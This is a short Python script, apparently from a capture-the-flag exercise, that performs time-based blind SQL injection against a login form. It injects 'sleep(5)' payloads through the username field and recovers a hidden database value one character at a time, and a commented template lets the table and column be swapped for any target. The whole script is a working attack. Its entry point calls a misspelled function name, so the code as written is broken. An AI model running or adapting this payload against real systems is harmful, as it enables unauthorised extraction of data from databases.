#!/usr/bin/env python3

import requests
import string
import time
import sys

def bruteforce():
    chars = string.printable[:-6]
    session =  requests.session()
    url = "[INPUT A WEBSITE]"#Can't show the one I used this on
    flag = ""
    code = 26
    while code >0:
        for char in chars:
            name = f"{flag}{char}"
            sys.stdout.write(f"\r[+] Database name: {name}")
            # f"admin' AND (select sleep(5) from dual where (SELECT [COLUMN_NAME HERE] FROM [TABLE_NAME_HERE] LIMIT 1) like '{name}%');-- -"
            payload = f"admin' AND (select sleep(5) from dual where (SELECT flag FROM its_in_here LIMIT 1) like '{name}%');-- -"
            data = {"username" : payload, #May be different from yours
                    "password" : "admin"}
            start = time.time()
            output = session.post(url, data = data, allow_redirects = False)
            fin = time.time()
            time_taken = fin - start
            if time_taken < 5:
                pass
            elif char == "%":
                pass
            else:
                flag += char
                code-=1
                print (flag)
                print("\n")
                break


if __name__ == ("__main__"):
    bruteforcer()
